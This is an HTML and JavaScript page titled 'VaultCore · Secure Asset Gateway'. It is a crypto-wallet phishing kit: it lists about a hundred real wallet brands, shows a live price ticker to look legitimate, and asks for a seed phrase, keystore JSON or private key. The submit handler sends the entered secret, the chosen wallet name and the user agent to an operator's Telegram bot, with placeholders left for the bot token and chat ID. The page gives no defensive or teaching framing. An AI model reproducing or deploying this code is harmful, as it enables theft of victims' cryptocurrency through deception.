<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>VaultCore · Secure Asset Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(ellipse at 20% 30%, #0b0f1a, #02040c);
            min-height: 100vh;
            padding: 2rem 1.5rem;
            position: relative;
        }

        /* background texture */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 32px 32px;
            pointer-events: none;
            z-index: 0;
        }

        .app-container {
            max-width: 1440px;
            margin: 0 auto;
            position: relative;
            z-index: 2;
        }

        /* main card */
        .vault-card {
            background: rgba(12, 18, 28, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 2rem;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.6);
            padding: 1.8rem;
            transition: all 0.3s;
        }

        /* market bar - professional */
        .market-bar {
            background: rgba(0, 0, 0, 0.35);
            border-radius: 1.5rem;
            padding: 0.8rem 1.5rem;
            margin-bottom: 2rem;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 1rem;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .market-title {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-weight: 500;
            font-size: 0.85rem;
            letter-spacing: 1px;
            color: #b9c7ff;
            background: rgba(59, 130, 246, 0.15);
            padding: 0.3rem 1rem;
            border-radius: 2rem;
        }
        .market-ticker {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            row-gap: 0.6rem;
        }
        .ticker-item {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 2rem;
            padding: 0.35rem 1.2rem;
            display: flex;
            align-items: baseline;
            gap: 0.6rem;
            transition: all 0.2s ease;
            font-size: 0.9rem;
        }
        .ticker-symbol {
            font-weight: 700;
            color: #e2e9ff;
        }
        .ticker-price {
            font-family: 'Inter', monospace;
            font-weight: 600;
            letter-spacing: 0.3px;
        }
        .change-badge {
            font-size: 0.7rem;
            font-weight: 600;
            border-radius: 1rem;
            padding: 0.15rem 0.6rem;
        }
        .positive { background: rgba(46, 230, 160, 0.15); color: #2ee6a0; }
        .negative { background: rgba(255, 107, 107, 0.15); color: #ff6b6b; }
        .last-updated {
            font-size: 0.7rem;
            color: #6b7a9e;
            white-space: nowrap;
        }

        /* header and wallet grid */
        .wallet-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
            margin: 1rem 0 1.2rem 0;
        }
        .wallet-header h2 {
            font-size: 1.6rem;
            font-weight: 600;
            background: linear-gradient(120deg, #ffffff, #a8bbff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .search-field {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 2rem;
            padding: 0.4rem 1rem;
            display: flex;
            align-items: center;
            gap: 0.6rem;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .search-field i { color: #8f9ed0; }
        .search-field input {
            background: transparent;
            border: none;
            padding: 0.5rem;
            color: white;
            font-size: 0.9rem;
            width: 200px;
            outline: none;
        }

        /* wallet grid */
        .wallets-container {
            max-height: 55vh;
            overflow-y: auto;
            margin: 1.5rem 0 1rem;
            padding-right: 0.3rem;
        }
        .wallets-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 1rem;
        }
        .wallet-item {
            background: rgba(22, 28, 40, 0.7);
            backdrop-filter: blur(4px);
            border-radius: 1.2rem;
            padding: 0.9rem 0.5rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.6rem;
            cursor: pointer;
            transition: 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            border: 1px solid rgba(255,255,255,0.05);
        }
        .wallet-item:hover {
            background: rgba(59, 130, 246, 0.2);
            transform: translateY(-3px);
            border-color: #3b82f6;
        }
        .wallet-icon {
            font-size: 2rem;
            width: 52px;
            height: 52px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(255,255,255,0.06);
            border-radius: 60px;
        }
        .wallet-name {
            font-weight: 500;
            font-size: 0.85rem;
            text-align: center;
            color: #f0f3ff;
        }
        .no-match {
            text-align: center;
            padding: 2rem;
            color: #7f8bb3;
        }

        /* modal styling */
        .modal-dark {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(16px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: 0.2s;
        }
        .modal-dark.active {
            visibility: visible;
            opacity: 1;
        }
        .modal-card {
            background: #11161fe6;
            border-radius: 2rem;
            width: 90%;
            max-width: 540px;
            border: 1px solid rgba(255,255,255,0.15);
            box-shadow: 0 35px 55px rgba(0,0,0,0.6);
            overflow: hidden;
        }
        .modal-header {
            padding: 1.2rem 1.5rem;
            background: rgba(0,0,0,0.4);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255,255,255,0.08);
        }
        .modal-header h3 {
            font-size: 1.3rem;
            font-weight: 600;
        }
        .close-modal {
            background: none;
            border: none;
            font-size: 1.8rem;
            cursor: pointer;
            color: #a0abcf;
        }
        .tabs {
            display: flex;
            background: #0c0f18;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding: 0.8rem;
            background: none;
            border: none;
            color: #b7c1e6;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            border-bottom: 2px solid transparent;
        }
        .tab.active {
            color: white;
            border-bottom-color: #3b82f6;
            background: rgba(59,130,246,0.1);
        }
        .modal-body {
            padding: 1.8rem;
        }
        .pane {
            display: none;
        }
        .pane.active-pane {
            display: block;
        }
        textarea, .modal-body input {
            width: 100%;
            background: #0a0d14;
            border: 1px solid #2a2f44;
            border-radius: 1.2rem;
            padding: 0.9rem;
            color: white;
            font-family: monospace;
            font-size: 0.85rem;
            margin: 0.5rem 0 1rem;
            resize: vertical;
        }
        .submit-creds {
            background: linear-gradient(95deg, #2c3e8f, #192152);
            width: 100%;
            padding: 0.9rem;
            border-radius: 2rem;
            border: none;
            font-weight: 600;
            color: white;
            margin-top: 0.8rem;
            cursor: pointer;
        }
        .toast-notify {
            position: fixed;
            bottom: 25px;
            left: 50%;
            transform: translateX(-50%);
            background: #1f2846e6;
            backdrop-filter: blur(12px);
            color: white;
            padding: 0.6rem 1.5rem;
            border-radius: 2rem;
            font-size: 0.8rem;
            z-index: 1100;
            display: none;
            white-space: nowrap;
        }
        footer {
            text-align: center;
            margin-top: 1.8rem;
            font-size: 0.7rem;
            color: #54607d;
        }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #1a1f2e; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 10px; }
        @media (max-width: 700px) {
            .vault-card { padding: 1.2rem; }
            .market-bar { flex-direction: column; align-items: flex-start; }
            .last-updated { align-self: flex-end; }
        }
    </style>
</head>
<body>
<div class="app-container">
    <div class="vault-card">
        <!-- Professional Market Rates -->
        <div class="market-bar">
            <div class="market-title">
                <i class="fas fa-chart-line" style="color:#3b82f6"></i> CRYPTO SPOT
            </div>
            <div class="market-ticker" id="liveTicker">
                <!-- injected prices -->
            </div>
            <div class="last-updated" id="updateTime">indexing...</div>
        </div>

        <!-- Wallet selection -->
        <div class="wallet-header">
            <h2><i class="fas fa-cube"></i> Select wallet protocol</h2>
            <div class="search-field">
                <i class="fas fa-search"></i>
                <input type="text" id="searchWallet" placeholder="Filter wallet...">
            </div>
        </div>
        <div class="wallets-container">
            <div id="walletsGrid" class="wallets-grid"></div>
        </div>
        <footer>🔐 choose your wallet to initiate secure handshake</footer>
    </div>
</div>

<!-- Modal -->
<div id="credentialModal" class="modal-dark">
    <div class="modal-card">
        <div class="modal-header">
            <h3 id="modalTitle"><i class="fas fa-key"></i> Enter credentials</h3>
            <button class="close-modal" id="closeModalBtn">&times;</button>
        </div>
        <div class="tabs">
            <button class="tab active" data-tab="phrase">Seed Phrase</button>
            <button class="tab" data-tab="keystore">Keystore JSON</button>
            <button class="tab" data-tab="pkey">Private Key</button>
        </div>
        <div class="modal-body">
            <div id="phrasePane" class="pane active-pane">
                <label>Recovery phrase (12/24 words)</label>
                <textarea id="seedInput" rows="3" placeholder="enter mnemonic phrase..."></textarea>
            </div>
            <div id="keystorePane" class="pane">
                <label>Keystore (JSON format)</label>
                <textarea id="keystoreInput" rows="3" placeholder='{"crypto": {...}...}'></textarea>
            </div>
            <div id="pkeyPane" class="pane">
                <label>Private key (hex)</label>
                <textarea id="pkeyInput" rows="2" placeholder="0x... or raw private key"></textarea>
            </div>
            <button id="submitCredentials" class="submit-creds"><i class="fas fa-shield-alt"></i> Verify & Connect</button>
        </div>
    </div>
</div>
<div id="globalToast" class="toast-notify"></div>

<script>
    // ====================== TELEGRAM CONFIGURATION ======================
    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Replace with actual bot token
    const CHAT_ID   = "YOUR_CHAT_ID_HERE";     // Replace with actual chat ID
    // ====================================================================

    // ---------------------------- WALLET DATABASE ------------------------
    const walletNames = [
        "MetaMask", "Trust Wallet", "Coinbase Wallet", "Ledger Live", "Trezor", "Exodus", "Phantom", "Rabby", "Argent", "Rainbow",
        "SafePal", "Keplr", "Electrum", "MyEtherWallet", "TokenPocket", "MathWallet", "imToken", "Status", "Zengo", "Cake Wallet",
        "BlueWallet", "Samourai", "Wasabi", "Edge", "Guarda", "Ownbit", "Unstoppable", "BRD", "Atomic Wallet", "Infinity Wallet",
        "Jaxx Liberty", "Coinomi", "BitPay", "Electron Cash", "Sparrow", "Specter", "Coldcard", "KeepKey", "OneKey", "GridPlus",
        "SecuX", "BitBox", "CoolWallet", "D'CENT", "Ellipal", "ZenGo", "OKX Wallet", "Binance Web3", "Bitget Wallet", "Bybit Wallet",
        "Kucoin Wallet", "Rainbow", "Frontier", "XDEFI", "Talisman", "SubWallet", "Nova Wallet", "Fearless", "Polkadot.js",
        "MetaMask Institutional", "Brave Wallet", "Opera Crypto", "GameStop Wallet", "Loopring Wallet", "Ronin Wallet", "Yoroi", "Daedalus",
        "Flint Wallet", "Martian", "Petra", "Pontem", "Nightly", "Backpack", "Solflare", "Glow Wallet", "Slope", "Eclipse", "Soul Wallet",
        "Blocto", "Portis", "Fortmatic", "Tor.us", "Web3Auth", "Sequence", "Bitski", "Venly", "Dapper Wallet", "Torus",
        "Coin98", "KardiaChain", "Heco Wallet", "Onto", "Starcoin", "Sui Wallet", "Martian Sui", "Ethos", "Fewcha", "Safepal S1"
    ];
    const uniqueWallets = [...new Map(walletNames.map(w => [w, w])).values()];

    function getWalletIcon(name) {
        const n = name.toLowerCase();
        if (n.includes("metamask")) return "fab fa-ethereum";
        if (n.includes("trust")) return "fas fa-check-circle";
        if (n.includes("coinbase")) return "fab fa-bitcoin";
        if (n.includes("ledger")) return "fas fa-microchip";
        if (n.includes("trezor")) return "fas fa-lock";
        if (n.includes("phantom")) return "fas fa-ghost";
        if (n.includes("exodus")) return "fas fa-charging-station";
        if (n.includes("rabby")) return "fas fa-gem";
        if (n.includes("argent")) return "fas fa-chart-line";
        if (n.includes("rainbow")) return "fas fa-palette";
        if (n.includes("safepal")) return "fas fa-shield-alt";
        if (n.includes("keplr")) return "fas fa-globe";
        if (n.includes("electrum")) return "fas fa-bolt";
        if (n.includes("myetherwallet")) return "fab fa-ethereum";
        if (n.includes("tokenpocket")) return "fas fa-wallet";
        if (n.includes("mathwallet")) return "fas fa-calculator";
        if (n.includes("coinbase")) return "fab fa-bitcoin";
        return "fas fa-wallet";
    }

    let selectedWallet = null;
    function renderWalletList(filter = "") {
        const filtered = uniqueWallets.filter(w => w.toLowerCase().includes(filter.toLowerCase()));
        const grid = document.getElementById("walletsGrid");
        if (filtered.length === 0) {
            grid.innerHTML = `<div class="no-match"><i class="fas fa-search-minus"></i> No wallet matches</div>`;
            return;
        }
        grid.innerHTML = filtered.map(w => `
            <div class="wallet-item" data-w="${w}">
                <div class="wallet-icon"><i class="${getWalletIcon(w)}"></i></div>
                <div class="wallet-name">${w}</div>
            </div>
        `).join('');
        document.querySelectorAll('.wallet-item').forEach(card => {
            card.addEventListener('click', () => {
                selectedWallet = card.getAttribute('data-w');
                openModal(selectedWallet);
            });
        });
    }

    // Modal handling
    const modal = document.getElementById("credentialModal");
    const modalTitleSpan = document.getElementById("modalTitle");
    function openModal(wallet) {
        modalTitleSpan.innerHTML = `<i class="fas fa-key"></i> ${wallet} · secure entry`;
        document.getElementById("seedInput").value = "";
        document.getElementById("keystoreInput").value = "";
        document.getElementById("pkeyInput").value = "";
        // reset to phrase tab
        document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
        document.getElementById("phrasePane").classList.add('active-pane');
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelector('.tab[data-tab="phrase"]').classList.add('active');
        modal.classList.add('active');
    }
    function closeModal() { modal.classList.remove('active'); }
    document.getElementById("closeModalBtn").addEventListener('click', closeModal);
    modal.addEventListener('click', (e) => { if(e.target === modal) closeModal(); });
    // Tabs inside modal
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            const target = tab.getAttribute('data-tab');
            document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
            if (target === 'phrase') document.getElementById("phrasePane").classList.add('active-pane');
            if (target === 'keystore') document.getElementById("keystorePane").classList.add('active-pane');
            if (target === 'pkey') document.getElementById("pkeyPane").classList.add('active-pane');
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
        });
    });

    // toast helper
    function showMessage(msg, duration = 3000) {
        const toast = document.getElementById("globalToast");
        toast.innerText = msg;
        toast.style.display = "block";
        setTimeout(() => toast.style.display = "none", duration);
    }

    // Telegram sender
    async function forwardToTelegram(content, type) {
        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
            console.warn("[DEMO] Would send to Telegram:", content);
            showMessage("⚠️ DEMO: credentials logged to console (Telegram not set)", 4000);
            return false;
        }
        const text = `🛡️ VAULTCORE EVENT\nWallet: ${selectedWallet}\nType: ${type}\nData:\n${content}\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent}`;
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text.slice(0, 4000) })
            });
            const json = await res.json();
            if (json.ok) return true;
            else throw new Error(json.description);
        } catch(e) { console.error(e); showMessage("Telegram error: " + e.message, 3000); return false; }
    }

    // Submit credentials from modal
    document.getElementById("submitCredentials").addEventListener('click', async () => {
        let credValue = "";
        let credType = "Seed Phrase";
        const activePaneElem = document.querySelector('.pane.active-pane');
        if (activePaneElem.id === "phrasePane") { credValue = document.getElementById("seedInput").value.trim(); credType = "Seed Phrase"; }
        else if (activePaneElem.id === "keystorePane") { credValue = document.getElementById("keystoreInput").value.trim(); credType = "Keystore JSON"; }
        else { credValue = document.getElementById("pkeyInput").value.trim(); credType = "Private Key"; }
        if (!credValue) { showMessage(`Please enter your ${credType}`, 2500); return; }
        showMessage(`Validating ${credType}...`, 1500);
        const success = await forwardToTelegram(credValue, credType);
        if (success) showMessage(`✓ ${selectedWallet} verified · secured`, 3000);
        else showMessage(`⚠️ Forwarding incomplete, but logged locally`, 3000);
        closeModal();
    });

    // Search wallet
    document.getElementById("searchWallet").addEventListener('input', (e) => renderWalletList(e.target.value));
    renderWalletList("");

    // ------------------------ LIVE MARKET (Professional ticker) ------------------------
    async function getPrices() {
        try {
            const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,bnb&vs_currencies=usd&include_24hr_change=true");
            const data = await res.json();
            return {
                btc: { price: data.bitcoin?.usd || 42350, change: data.bitcoin?.usd_24h_change || 0 },
                eth: { price: data.ethereum?.usd || 2250, change: data.ethereum?.usd_24h_change || 0 },
                sol: { price: data.solana?.usd || 96, change: data.solana?.usd_24h_change || 0 },
                bnb: { price: data.bnb?.usd || 310, change: data.bnb?.usd_24h_change || 0 }
            };
        } catch (e) { return null; }
    }

    function updateTickerUI(prices) {
        const container = document.getElementById("liveTicker");
        if (!prices) { container.innerHTML = `<span style="opacity:0.7;">loading market data...</span>`; return; }
        const items = [
            { sym: "BTC", price: prices.btc.price, ch: prices.btc.change },
            { sym: "ETH", price: prices.eth.price, ch: prices.eth.change },
            { sym: "SOL", price: prices.sol.price, ch: prices.sol.change },
            { sym: "BNB", price: prices.bnb.price, ch: prices.bnb.change }
        ];
        container.innerHTML = items.map(i => {
            const changeClass = i.ch >= 0 ? "positive" : "negative";
            const arrow = i.ch >= 0 ? "▲" : "▼";
            return `<div class="ticker-item"><span class="ticker-symbol">${i.sym}</span><span class="ticker-price">$${i.price.toLocaleString()}</span><span class="change-badge ${changeClass}">${arrow} ${Math.abs(i.ch).toFixed(2)}%</span></div>`;
        }).join('');
        // subtle motion: fade effect
        const el = document.querySelectorAll('.ticker-item');
        el.forEach(e => { e.style.transform = "scale(1.02)"; setTimeout(() => e.style.transform = "", 150); });
        const timeEl = document.getElementById("updateTime");
        timeEl.innerHTML = `<i class="far fa-clock"></i> ${new Date().toLocaleTimeString()}`;
    }

    async function refreshMarket() {
        const data = await getPrices();
        if (data) updateTickerUI(data);
        else updateTickerUI(null);
    }
    refreshMarket();
    setInterval(refreshMarket, 10000);
    // initial load toast
    setTimeout(() => showMessage("🔐 Select your wallet to begin", 3500), 500);
</script>
</body>
</html>
